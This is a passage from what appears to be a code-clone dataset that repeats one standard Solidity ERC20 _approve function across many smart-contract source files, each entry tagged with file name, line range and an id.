    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="98" endline="107" pcid="2872">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="96" endline="105" pcid="2996">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="99" endline="108" pcid="2857">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="716" endline="725" pcid="8081">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="97" endline="106" pcid="6815">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="183" endline="192" pcid="4907">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="98" endline="107" pcid="6155">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="100" endline="109" pcid="1646">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="100" endline="109" pcid="4650">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="101" endline="110" pcid="4275">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="97" endline="106" pcid="1040">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="102" endline="111" pcid="6204">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="98" endline="107" pcid="3011">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="98" endline="107" pcid="2545">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="98" endline="107" pcid="1789">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="100" endline="109" pcid="2842">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="424" endline="433" pcid="3032">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="96" endline="105" pcid="2827">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="92" endline="101" pcid="5596">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="101" endline="110" pcid="2469">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="98" endline="107" pcid="3063">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="99" endline="108" pcid="3078">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="98" endline="107" pcid="2806">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="98" endline="107" pcid="2454">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="100" endline="109" pcid="3093">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="101" endline="110" pcid="9134">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="101" endline="110" pcid="735">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="99" endline="108" pcid="6055">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="100" endline="109" pcid="3108">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="98" endline="107" pcid="2790">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="102" endline="111" pcid="3123">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="100" endline="109" pcid="2439">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="97" endline="106" pcid="3138">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="98" endline="107" pcid="7964">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="190" endline="199" pcid="622">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="98" endline="107" pcid="4798">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="100" endline="109" pcid="1450">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="97" endline="106" pcid="3153">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="101" endline="110" pcid="7239">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="102" endline="111" pcid="2579">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="188" endline="197" pcid="3168">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="97" endline="106" pcid="2770">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="101" endline="110" pcid="2424">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="99" endline="108" pcid="3183">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="98" endline="107" pcid="3198">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="99" endline="108" pcid="946">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="97" endline="106" pcid="7432">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="99" endline="108" pcid="3213">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="97" endline="106" pcid="2755">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="101" endline="110" pcid="4747">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="101" endline="110" pcid="2409">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="96" endline="105" pcid="5408">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="97" endline="106" pcid="3228">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="99" endline="108" pcid="3243">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="100" endline="109" pcid="3764">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="100" endline="109" pcid="2740">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="191" endline="200" pcid="2394">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="99" endline="108" pcid="3258">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="201" endline="210" pcid="7088">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="94" endline="103" pcid="3278">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="97" endline="106" pcid="145">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="97" endline="106" pcid="2379">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="97" endline="106" pcid="3293">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="93" endline="102" pcid="2725">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="100" endline="109" pcid="2708">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="98" endline="107" pcid="3314">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="97" endline="106" pcid="1264">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="99" endline="108" pcid="7042">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="97" endline="106" pcid="2364">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="96" endline="105" pcid="3329">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="95" endline="104" pcid="2693">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="198" endline="207" pcid="3825">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="100" endline="109" pcid="7388">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="100" endline="109" pcid="335">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="95" endline="104" pcid="3349">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="99" endline="108" pcid="5520">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="100" endline="109" pcid="2631">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="96" endline="105" pcid="2349">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="97" endline="106" pcid="2678">
    function _approve(
